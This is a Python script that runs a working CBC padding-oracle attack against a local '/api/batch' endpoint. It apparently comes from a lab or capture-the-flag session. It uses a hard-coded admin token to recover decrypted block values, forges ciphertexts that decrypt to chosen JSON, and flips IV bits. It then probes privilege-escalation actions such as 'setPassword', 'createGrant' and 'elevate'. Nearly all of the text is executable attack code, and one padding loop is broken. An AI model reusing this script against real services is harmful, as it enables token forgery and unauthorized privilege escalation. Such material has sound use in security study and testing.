#!/usr/bin/env python3
"""
Full padding oracle attack + ciphertext crafting for BatchRequest /api/batch.

Admin token structure (48 bytes): IV(16) + C1(16) + C2(16)
Known plaintext: "11F6GwRDZf@Swo%0@XZmq!-%=M" + 0x06*6 (PKCS7)

Goal: craft ciphertext that decrypts to valid BatchEnvelope JSON
"""

import base64, urllib.request, json, sys, concurrent.futures, time

TARGET = "http://127.0.0.1:5000/api/batch"
ADMIN_TOKEN = base64.b64decode("GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz")
IV_orig, C1_orig, C2_orig = ADMIN_TOKEN[:16], ADMIN_TOKEN[16:32], ADMIN_TOKEN[32:48]

def oracle(iv: bytes, c_block: bytes) -> bool:
    payload = base64.b64encode(iv + c_block).decode()
    data = json.dumps({"Action": "x", "Payload": payload}).encode()
    req = urllib.request.Request(TARGET, data=data,
                                  headers={"Content-Type": "application/json",
                                           "Accept": "application/json"},
                                  method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            raw = r.read().decode()
    except urllib.error.HTTPError as e:
        raw = e.read().decode() if e.read else ""
    except Exception:
        return False
    return "Padding is invalid" not in raw

def recover_D(c_block: bytes, label: str) -> bytes:
    """Recover D(c_block) via padding oracle."""
    D = bytearray(16)
    for byte_pos in range(15, -1, -1):
        pad_val = 16 - byte_pos
        # Build base IV for known bytes
        def make_iv(guess, bp=byte_pos, pv=pad_val):
            iv = bytearray(16)
            for j in range(bp + 1, 16):
                iv[j] = D[j] ^ pv
            iv[bp] = guess
            return bytes(iv)

        with concurrent.futures.ThreadPoolExecutor(max_workers=32) as ex:
            futures = {ex.submit(oracle, make_iv(g), c_block): g for g in range(256)}
            results = {futures[f]: f.result() for f in concurrent.futures.as_completed(futures)}

        candidates = [g for g, ok in results.items() if ok]
        if not candidates:
            print(f"[ERROR] No valid guess for {label} byte {byte_pos}")
            sys.exit(1)

        # Resolve false positives by flipping the preceding byte
        if len(candidates) > 1 and byte_pos > 0:
            verified = []
            for g in candidates:
                iv_v = bytearray(make_iv(g))
                iv_v[byte_pos - 1] ^= 0x01
                if oracle(bytes(iv_v), c_block):
                    verified.append(g)
            candidates = verified if verified else candidates

        D[byte_pos] = candidates[0] ^ pad_val
        print(f"  [{label}] byte {byte_pos:2d} = 0x{D[byte_pos]:02x}", flush=True)

    return bytes(D)


# ──────────────────────────────────────────────
# Phase 1: Recover D(C2)
# ──────────────────────────────────────────────
print("=== Phase 1: Oracle on C2 ===")
t0 = time.time()
D_C2 = recover_D(C2_orig, "C2")
print(f"D(C2) = {D_C2.hex()} ({time.time()-t0:.0f}s)\n")

PT2_orig = bytes(D_C2[i] ^ C1_orig[i] for i in range(16))
print(f"Original PT2 = {PT2_orig!r} ({PT2_orig.hex()})")
print()

# ──────────────────────────────────────────────
# Phase 2: Craft ciphertext for a target BatchEnvelope JSON
# Target plaintext (32 bytes, PKCS7 padded):
#   {"action":"test"}               \x0f * 15  (17 bytes + 15 padding)
#   → let's see what "action" values exist first
#
# Try several potential BatchEnvelope JSON bodies (must be exactly 32 bytes padded)
# ──────────────────────────────────────────────

def craft_ciphertext(desired_plaintext: bytes) -> bytes:
    """
    Given a 32-byte padded plaintext (PKCS7), produce a 48-byte ciphertext (IV+C1'+C2')
    via two oracle calls.
    """
    assert len(desired_plaintext) == 32

    desired_PT1 = desired_plaintext[:16]
    desired_PT2 = desired_plaintext[16:]

    # Step A: Choose C1' so that D(C2_orig) XOR C1' = desired_PT2
    #   → C1' = D(C2_orig) XOR desired_PT2
    C1_prime = bytes(D_C2[i] ^ desired_PT2[i] for i in range(16))
    print(f"C1' = {C1_prime.hex()}")

    # Step B: Oracle C1' to get D(C1')
    print("=== Phase 2a: Oracle on C1' ===")
    t0 = time.time()
    D_C1_prime = recover_D(C1_prime, "C1'")
    print(f"D(C1') = {D_C1_prime.hex()} ({time.time()-t0:.0f}s)\n")

    # Step C: Choose IV so that D(C1') XOR IV = desired_PT1
    new_IV = bytes(D_C1_prime[i] ^ desired_PT1[i] for i in range(16))
    print(f"new IV = {new_IV.hex()}")

    return new_IV + C1_prime + C2_orig


def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    n = block_size - (len(data) % block_size)
    return data + bytes([n] * n)


# ──────────────────────────────────────────────
# Phase 3: Find valid BatchEnvelope action/format
# Try different action names to see what the server accepts
# ──────────────────────────────────────────────

def test_payload(plaintext_str: str) -> str:
    """Test a plaintext JSON string against the live target."""
    padded = pkcs7_pad(plaintext_str.encode())
    if len(padded) > 32:
        return f"TOO_LONG ({len(padded)} bytes after padding)"
    # Pad to exactly 32 bytes
    while len(padded) < 32:
        # prefix with spaces to fill first block
        padded = padded  # already padded by pkcs7_pad
    ciphertext = craft_ciphertext(padded)
    ct_b64 = base64.b64encode(ciphertext).decode()
    data = json.dumps({"Action": "x", "Payload": ct_b64}).encode()
    req = urllib.request.Request(TARGET, data=data,
                                  headers={"Content-Type": "application/json",
                                           "Accept": "application/json"},
                                  method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()


# Quick oracle-free test: reuse my bit-flip to probe action names
print("\n=== Phase 2: Probing BatchEnvelope structure with bit-flip ===")
# We already know PT1={"action":"test" gives "Invalid timestamp"
# Let's try different action strings in PT1 and see if error changes

def test_pt1_action(action_name: str) -> str:
    """
    Bit-flip IV to make PT1 = {"action":"<action_name>" (16 bytes)
    Returns the server's error message.
    """
    # Current PT1 from original admin token
    PT1_current = b"11F6GwRDZf@Swo%0"
    desired_PT1 = f'{{"action":"{action_name}"'.encode()[:16].ljust(16, b' ')
    new_IV = bytes(IV_orig[i] ^ PT1_current[i] ^ desired_PT1[i] for i in range(16))
    ciphertext = new_IV + C1_orig + C2_orig
    payload = base64.b64encode(ciphertext).decode()
    data = json.dumps({"Action": "x", "Payload": payload}).encode()
    req = urllib.request.Request(TARGET, data=data,
                                  headers={"Content-Type": "application/json",
                                           "Accept": "application/json"},
                                  method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = json.loads(r.read())
    except urllib.error.HTTPError as e:
        body = json.loads(e.read())
    return body.get("responseStatus", {}).get("message", "no message")


# Probe action names
for action in ["test", "createGrant", "CreateGrant", "create", "grant",
               "setPassword", "SetPassword", "resetPassword", "createApiKey",
               "CreateApiKey", "admin", "promote", "elevate"]:
    msg = test_pt1_action(action)
    print(f"  action={action!r:20s} → {msg[:60]}")
